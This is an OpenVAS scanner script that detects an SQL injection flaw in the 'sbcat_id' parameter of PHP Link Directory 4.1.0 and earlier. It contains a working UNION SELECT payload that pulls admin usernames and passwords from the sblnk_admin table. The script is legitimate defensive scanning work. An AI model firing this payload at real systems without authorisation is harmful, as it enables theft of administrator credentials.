###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_php_link_directory_sql_inj_vuln.nasl 7024 2017-08-30 11:51:43Z teissa $
#
# PHP Link Directory Software 'sbcat_id' Parameter SQL Injection Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801836");
  script_version("$Revision: 7024 $");
  script_tag(name:"last_modification", value:"$Date: 2017-08-30 13:51:43 +0200 (Wed, 30 Aug 2017) $");
  script_tag(name:"creation_date", value:"2011-02-07 15:21:16 +0100 (Mon, 07 Feb 2011)");
  script_bugtraq_id(46048);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("PHP Link Directory Software 'sbcat_id' Parameter SQL Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/16061/");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to cause SQL
  Injection attack and gain sensitive information.

  Impact Level: Application");
  script_tag(name:"affected", value:"PHP link Directory software 4.1.0 and prior.");
  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input
  via the 'sbcat_id' parameter in showcats.php, which allows attacker to
  manipulate SQL queries by injecting arbitrary SQL code.");
  script_tag(name:"solution", value:"No solution or patch was made available for at least one year
  since disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"The host is running PHP Link Directory Software and is prone to
  SQL injection vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port( default:80 );

## Check Host Supports PHP
if( ! can_host_php( port:port ) ) exit( 0 );

foreach dir( make_list_unique( "/directory", "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  ## Send and Receive the response
  res = http_get_cache( item: dir + "/index.php", port:port );

  ## Confirm the application
  if( '>PHP link Directory software' >< res ) {
    ## Try SQL injection and check the response to confirm vulnerability
    url = dir + "/showcats.php?sbcat_id=-9999+union+all+select+1,concat(0x4f70" +
          "656e564153,0x3a,username,0x3a,password,0x3a,0x4f70656e564153),3,4+" +
          "from+sblnk_admin--";

    if( http_vuln_check( port:port, url:url, pattern:'>OpenVAS:(.+):(.+):OpenVAS<' ) ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );